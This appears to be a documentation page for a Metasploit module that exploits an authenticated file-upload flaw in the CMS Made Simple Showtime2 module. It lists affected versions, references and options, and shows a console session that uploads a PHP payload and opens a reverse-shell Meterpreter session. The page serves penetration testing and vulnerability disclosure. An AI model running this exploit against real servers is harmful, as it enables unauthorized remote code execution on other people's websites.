---
layout: default
---

# CMS Made Simple (CMSMS) Showtime2 module < 3.6.3 File Upload RCE

This module exploits a File Upload vulnerability that lead in a RCE in Showtime2 module (<= 3.6.2) in CMS Made Simple (CMSMS). An authenticated user with "Use Showtime2" privilege could exploit the vulnerability.

The vulnerability exists in the Showtime2 module, where the class "class.showtime2_image.php" does not ensure that a watermark file has a standard image file extension (GIF, JPG, JPEG, or PNG).

Tested on Showtime2 3.6.2, 3.6.1, 3.6.0, 3.5.4, 3.5.3, 3.5.2, 3.5.1, 3.5.0, 3.4.5, 3.4.3, 3.4.2 on CMS Made Simple (CMSMS) 2.2.9.1

## Module Name

exploit/multi/http/cmsms_showtime2_rce

## Authors

* Daniele Scanu (Discovery)
* Fabio Cogno (Metasploit Module)

## Disclosure date

Mar 11, 2019

## Actions

* CHECK
* EXPLOIT

## Reliability

[Normal](https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking)

## References

* [CWE-434](https://cwe.mitre.org/data/definitions/434.html)
* [Announcing CMS Made Simple v2.2.10 - Spuzzum](https://forum.cmsmadesimple.org/viewtopic.php?f=1&t=80285)
* [REPOSITORY SUBVERSION SHOWTIME2](http://viewsvn.cmsmadesimple.org/diff.php?repname=showtime2&path=%2Ftrunk%2Flib%2Fclass.showtime2_image.php&rev=47)
* [CMS Made Simple Showtime2 Module 3.6.2 - (Authenticated) Arbitrary File Upload](https://www.exploit-db.com/exploits/46546)

## Required Options

* RHOST - The target address
* RPORT - The target port (TCP)
* USERNAME - Username to authenticate with
* PASSWORD - Password to authenticate with

## Not Required Options

* TARGETURI - Base CMS Made Simple directory path ("/" is the default)

## Basic Usage

To display the available options, load the module within the Metasploit console and run the commands 'show options':

```
msf5 > use exploit/multi/http/cmsms_showtime2_rce 
msf5 exploit(multi/http/cmsms_showtime2_rce) > set rhost target.com
rhost => target.com
msf5 exploit(multi/http/cmsms_showtime2_rce) > check

[*] Showtime2 version: 3.6.2
[*] 192.168.2.59:80 - The target appears to be vulnerable.
msf5 exploit(multi/http/cmsms_showtime2_rce) > set username Designer
username => Designer
msf5 exploit(multi/http/cmsms_showtime2_rce) > set password d3s1gn3r
password => d3s1gn3r
msf5 exploit(multi/http/cmsms_showtime2_rce) > exploit

[*] Started reverse TCP handler on 10.0.8.2:4444 
[*] Showtime2 version: 3.6.2
[*] Uploading PHP payload.
[*] Making request for '/06wp7Fen.php' to execute payload.
[*] Sending stage (38247 bytes) to 192.168.2.59
[*] Meterpreter session 1 opened (10.0.8.2:4444 -> 192.168.2.59:59932) at 2019-03-19 23:27:07 +0100
[!] Tried to delete ./06wp7Fen.php, unknown result

meterpreter > getuid
Server username: www-data (33)
meterpreter > quit
[*] Shutting down Meterpreter...

[*] 192.168.2.59 - Meterpreter session 1 closed.  Reason: User exit
msf5 exploit(multi/http/cmsms_showtime2_rce) >
```

---

[back](./)